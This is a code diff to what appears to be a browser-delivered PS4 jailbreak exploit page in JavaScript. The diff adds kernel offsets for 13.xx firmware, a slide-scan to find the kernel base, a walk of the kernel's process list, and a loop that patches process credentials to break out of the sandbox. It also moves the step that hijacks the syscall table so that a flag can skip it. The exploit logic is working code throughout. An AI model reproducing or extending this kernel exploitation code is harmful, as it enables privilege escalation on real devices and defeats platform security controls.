@@ -118,7 +118,7 @@ html, body {
 // ========== SHARED CONFIG ==========
 var Q = new URLSearchParams(location.search);
 
-var REVISION = "genuine-u8-rw-6-1352";
+var REVISION = "genuine-u8-rw-8-1352";
 var headerMsg = "mansoor0x";
 
 var MAX_ATTEMPTS = (function(){
@@ -220,7 +220,16 @@ var TAG_MAP = {
     "KSCAN-PROC-DONE":    ["KEXPLOIT", "info"],
     "KSCAN-SIG-SKIP":     ["KEXPLOIT", "info"],
     "PROC-CAND":          ["KEXPLOIT", "info"],
+    "PROC-HARVEST":       ["KEXPLOIT", "info"],
+    "ALLPROC-WALK":       ["KEXPLOIT", "info"],
+    "ALLPROC-TRY":        ["KEXPLOIT", "run"],
     "PRISON0":            ["KEXPLOIT", "info"],
+    "KBASE-SRC":          ["KEXPLOIT", "info"],
+    "KBASE-FOUND":        ["KEXPLOIT", "info"],
+    "KBASE-WARN":         ["KEXPLOIT", "fail"],
+    "SYSENT-HIJACK-SKIP": ["KEXPLOIT", "info"],
+    "KERNEL-STAGE-MISS":  ["KEXPLOIT", "fail"],
+    "KERNEL-STAGE-OK":    ["KEXPLOIT", "pass"],
     "JAILBREAK-ERROR":    ["KEXPLOIT", "fail"],
     "SCAN-HIT":           ["SANDBOX", "info"],
     "UCRED-SIG-CANDIDATE":["SANDBOX", "info"],
@@ -364,11 +373,11 @@ var PS4_OFFSETS = {
     "11.50": { evf: 0x784318, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x704D5 },
     "12.00": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
     "12.50": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
-    "13.00": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
-    "13.02": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
-    "13.04": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
-    "13.50": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
-    "13.52": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 }
+    "13.00": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538 },
+    "13.02": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538 },
+    "13.04": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538 },
+    "13.50": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538 },
+    "13.52": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x4D6D0, allproc: 0x1B28538 }
 };
 
 // ========== PARAMETERS ==========
@@ -472,16 +481,136 @@ function kptrBig(v) {
     return b > 0xffffffff00000000n && b < 0xffffffffffff0000n;
 }
 
-function kernelBaseFromQuery() {
-    var raw = Q.get("kb");
-    if (!raw) return 0xffffffff80000000n;
+var KBASE_DEFAULT = 0xffffffff80000000n;
+var KBASE_SLIDE_MAX = 0x2800000n;
+
+function parseKernelBaseString(raw) {
+    if (!raw) return null;
     raw = String(raw).trim().toLowerCase();
     if (raw.indexOf("0x") === 0) raw = raw.slice(2);
-    try { return BigInt("0x" + raw); } catch (_) {}
-    return 0xffffffff80000000n;
+    try {
+        var b = BigInt("0x" + raw);
+        return kptrBig(b) ? b : null;
+    } catch (_) {}
+    return null;
 }
 
-function buildProcCandidates(kbase, evfOff) {
+function kernelBaseFromQuery() {
+    var b = parseKernelBaseString(Q.get("kb"));
+    return b !== null ? b : KBASE_DEFAULT;
+}
+
+function kernelBaseFromStorage() {
+    var keys = ["ps4lab_kernel_base", "wk-kernelBase", "jb-kernel-base"];
+    for (var i = 0; i < keys.length; i++) {
+        try {
+            var v = localStorage.getItem(keys[i]) || sessionStorage.getItem(keys[i]);
+            var b = parseKernelBaseString(v);
+            if (b !== null) return b;
+        } catch (_) {}
+    }
+    return null;
+}
+
+function probeKernelBase(kbase, sysentOff, prison0Off) {
+    try {
+        if (!probeKernelBaseLoose(kbase, sysentOff)) return false;
+        var pr = read64(kbase + BigInt(prison0Off));
+        return kptrBig(pr);
+    } catch (_) {
+        return false;
+    }
+}
+
+function probeKernelBaseLoose(kbase, sysentOff) {
+    try {
+        var se = kbase + BigInt(sysentOff);
+        var narg = read64(se) & 0xFFFFFFFFn;
+        if (narg > 8n) return false;
+        var call = read64(se + 8n);
+        if (!kptrBig(call)) return false;
+        var thr = read64(se + 0x2Cn) & 0xFFFFFFFFn;
+        return thr <= 0x10000n;
+    } catch (_) {
+        return false;
+    }
+}
+
+function enumerateAllproc(kbase, allprocOff, max) {
+    var out = [];
+    if (!allprocOff) return out;
+    try {
+        var cur = read64(kbase + BigInt(allprocOff));
+        if (!kptrBig(cur)) return out;
+        var head = cur;
+        for (var i = 0; i < max; i++) {
+            out.push(cur);
+            var next = read64(cur);
+            if (!kptrBig(next) || next === cur) break;
+            cur = next;
+            if (cur === head) break;
+        }
+    } catch (_) {}
+    return out;
+}
+
+function resolveKernelBaseAsync(sysentOff, prison0Off, done) {
+    if (Q.get("kb")) {
+        var qk = kernelBaseFromQuery();
+        mark("KBASE-SRC", "query");
+        done(qk, probeKernelBase(qk, sysentOff, prison0Off));
+        return;
+    }
+    var stored = kernelBaseFromStorage();
+    if (stored !== null && probeKernelBase(stored, sysentOff, prison0Off)) {
+        mark("KBASE-SRC", "storage");
+        done(stored, true);
+        return;
+    }
+    mark("KBASE-SRC", "slide-scan");
+    var slide = 0n;
+    function chunk() {
+        var end = slide + 0x80000n;
+        if (end > KBASE_SLIDE_MAX) end = KBASE_SLIDE_MAX;
+        for (; slide < end; slide += 0x4000n) {
+            var kb = KBASE_DEFAULT + slide;
+            if (probeKernelBase(kb, sysentOff, prison0Off)) {
+                mark("KBASE-FOUND", hex(kb) + "-slide=" + hex(slide));
+                done(kb, true);
+                return;
+            }
+        }
+        if (slide < KBASE_SLIDE_MAX) setTimeout(chunk, 0);
+        else {
+            mark("KBASE-FOUND", "none");
+            mark("KBASE-WARN", "unverified-default-" + hex(KBASE_DEFAULT));
+            done(KBASE_DEFAULT, false);
+        }
+    }
+    setTimeout(chunk, 0);
+}
+
+function harvestKernelPtrsNearHost() {
+    var out = [];
+    if (!isFinite(hostAddress) || !plausibleCell(hostAddress)) return out;
+    var center = BigInt(Math.floor(hostAddress));
+    var span = 0x80000n;
+    var seen = Object.create(null);
+    for (var delta = -span; delta <= span; delta += 8n) {
+        try {
+            var p = read64(center + delta);
+            if (!kptrBig(p)) continue;
+            var key = p.toString(16);
+            if (seen[key]) continue;
+            seen[key] = 1;
+            out.push(p);
+            if (out.length >= 48) break;
+        } catch (_) {}
+    }
+    return out;
+}
+
+function buildProcCandidates(kbase, evfOff, harvested) {
     var out = [];
     var seen = Object.create(null);
     function add(v) {
@@ -490,6 +619,9 @@ function buildProcCandidates(kbase, evfOff) {
         if (seen[key]) return;
         seen[key] = 1;
         out.push(v);
+    }
+    if (harvested) {
+        for (var h = 0; h < harvested.length; h++) add(harvested[h]);
     }
     var sym = kbase + BigInt(evfOff);
     add(sym);
@@ -1068,20 +1200,31 @@ function runJailbreak() {
     mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);
     compactLog(48);
 
-    var evf, prison0, rootvnode, sysent, jmp, kbase, sysent_661, jmp_rsi;
+    var evf = fwOffsets.evf;
+    var prison0 = fwOffsets.prison0;
+    var rootvnode = fwOffsets.rootvnode;
+    var sysent = fwOffsets.sysent;
+    var jmp = fwOffsets.jmp;
+    var allprocOff = fwOffsets.allproc || 0;
+    var skipKhij = Q.get("khij") === "0";
+
+    resolveKernelBaseAsync(sysent, prison0, function onKbase(kbase, verified) {
+        runJailbreakWithKbase(kbase, verified);
+    });
+
+    function runJailbreakWithKbase(kbase, verified) {
+    var sysent_661, jmp_rsi;
     var sy_narg, sy_call, sy_thrcnt, proc, sandboxEscaped, verifyUid, verifyGid, verifyPrison;
     var dbgMode, prisonVal, hits, scanOff, sigPtr, sigEnd;
     var procCandidates, procCandIdx, procResolved;
+    var sysentHijacked = false;
+    var allprocList = [];
+    var allprocIdx = 0;
 
     try {
-        evf = fwOffsets.evf;
-        prison0 = fwOffsets.prison0;
-        rootvnode = fwOffsets.rootvnode;
-        sysent = fwOffsets.sysent;
-        jmp = fwOffsets.jmp;
-
-        kbase = kernelBaseFromQuery();
-        mark("KERNEL-BASE", hex(kbase) + (Q.get("kb") ? "-query" : "-default"));
+        var looseOk = probeKernelBaseLoose(kbase, sysent);
+        mark("KERNEL-BASE", hex(kbase) + (verified ? "-verified" : (looseOk ? "-sysent-ok" : "-guess")));
+        if (!verified && !looseOk) mark("KBASE-WARN", "sysent-signature-weak-still-trying-jb-path");
 
         sysent_661 = kbase + BigInt(sysent);
         jmp_rsi = kbase + BigInt(jmp);
@@ -1090,21 +1233,19 @@ function runJailbreak() {
 
         proc = 0n;
         procResolved = false;
-        procCandidates = buildProcCandidates(kbase, evf);
+        var harvested = harvestKernelPtrsNearHost();
+        mark("PROC-HARVEST", "host=" + (isFinite(hostAddress) ? hex(hostAddress) : "na") + "-kptrs=" + harvested.length);
+        allprocList = enumerateAllproc(kbase, allprocOff, 320);
+        mark("ALLPROC-WALK", "count=" + allprocList.length + "-off=" + (allprocOff ? hex(allprocOff) : "na"));
+        procCandidates = buildProcCandidates(kbase, evf, harvested);
+        for (var ap = 0; ap < allprocList.length; ap++) {
+            procCandidates.push(allprocList[ap]);
+        }
         procCandIdx = 0;
-        mark("PROC-CAND", "count=" + procCandidates.length);
+        mark("PROC-CAND", "count=" + procCandidates.length + "-allproc=" + allprocList.length);
 
         prisonVal = read64(kbase + BigInt(prison0));
         mark("PRISON0", hex(prisonVal));
-
-        sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
-        sy_call = read64(sysent_661 + 8n);
-        sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);
-
-        write64(sysent_661, 2n);
-        write64(sysent_661 + 8n, jmp_rsi);
-        write64(sysent_661 + 0x2Cn, 1n);
-        mark("SYSENT-HIJACKED", "success");
 
         sandboxEscaped = false;
         verifyUid = -1n;
@@ -1113,6 +1254,24 @@ function runJailbreak() {
         dbgMode = Q.get("dbg") === "1";
         hits = 0;
         scanOff = 0;
+        allprocIdx = 0;
+
+        if (skipKhij) {
+            mark("SYSENT-HIJACK-SKIP", "khij=0");
+            mark("KERNEL-STAGE-MISS", "kexploit-arm-disabled");
+            mark("===== JAILBREAK COMPLETE =====", "userland-rw=OK-khij=0");
+            return;
+        }
+
+        sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
+        sy_call = read64(sysent_661 + 8n);
+        sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);
+
+        write64(sysent_661, 2n);
+        write64(sysent_661 + 8n, jmp_rsi);
+        write64(sysent_661 + 0x2Cn, 1n);
+        sysentHijacked = true;
+        mark("SYSENT-HIJACKED", "success");
     } catch (error) {
         mark("JAILBREAK-ERROR", error.message);
         return;
@@ -1131,9 +1290,11 @@ function runJailbreak() {
     }
 
     function restoreSysent() {
+        if (!sysentHijacked) return;
         write64(sysent_661, BigInt(sy_narg));
         write64(sysent_661 + 8n, sy_call);
         write64(sysent_661 + 0x2Cn, BigInt(sy_thrcnt));
+        sysentHijacked = false;
         mark("SYSENT-RESTORED", "success");
     }
 
@@ -1161,7 +1322,9 @@ function runJailbreak() {
                 mark("ROOT-VNODE-SET", "FAILED-no-curproc");
             }
             restoreSysent();
-            mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " root=" + sandboxEscaped + "-fs=" + rootVerified);
+            if (sandboxEscaped) mark("KERNEL-STAGE-OK", "sandbox-escaped");
+            else mark("KERNEL-STAGE-MISS", "no-curproc-allproc-and-marker-miss");
+            mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " sandbox=" + sandboxEscaped + "-fs=" + rootVerified + "-userland-rw=OK");
         } catch (error) {
             try { restoreSysent(); } catch (_) {}
             mark("JAILBREAK-ERROR", error.message);
@@ -1298,13 +1461,61 @@ function runJailbreak() {
         }
     }
 
-    function startKernelScan() {
+    function tryAllprocEscapeChunk() {
+        try {
+            if (allprocList.length === 0) {
+                setTimeout(startMarkerScan, 0);
+                return;
+            }
+            mark("ALLPROC-TRY", "idx=" + allprocIdx + "/" + allprocList.length);
+            var end = Math.min(allprocIdx + 3, allprocList.length);
+            for (; allprocIdx < end; allprocIdx++) {
+                proc = allprocList[allprocIdx];
+                procResolved = true;
+                if (tryDirectUcredOnProc()) {
+                    mark("SANDBOX-ESCAPE", "success-allproc-direct");
+                    setTimeout(finalizeJailbreak, 0);
+                    return;
+                }
+                var off = 0;
+                for (; off < 0x4000; off += 8) {
+                    var candidate = read64(proc + BigInt(off));
+                    if ((candidate & 0xFFFFFFFFn) !== 0x726f7272n) continue;
+                    hits++;
+                    var ucred = read64(proc + BigInt(off - 0x40));
+                    if (!kptrBig(ucred)) continue;
+                    if (patchAndVerifyUcred(ucred, prisonVal)) {
+                        sandboxEscaped = true;
+                        mark("SANDBOX-ESCAPE", "success-allproc-rror");
+                        mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
+                        setTimeout(finalizeJailbreak, 0);
+                        return;
+                    }
+                }
+            }
+            if (allprocIdx < allprocList.length) setTimeout(tryAllprocEscapeChunk, 0);
+            else setTimeout(startMarkerScan, 0);
+        } catch (error) {
+            try { restoreSysent(); } catch (_) {}
+            mark("JAILBREAK-ERROR", error.message);
+        }
+    }
+
+    function startMarkerScan() {
         compactLog(40);
         mark("KSCAN-BEGIN", "candidates=" + procCandidates.length);
+        procCandIdx = 0;
+        procResolved = false;
         setTimeout(scanProcChunk, 0);
     }
 
+    function startKernelScan() {
+        compactLog(40);
+        setTimeout(tryAllprocEscapeChunk, 0);
+    }
+
     setTimeout(startKernelScan, 150);
+    }
 }
 
 // ========== AUTO-RETRY ENGINE ==========
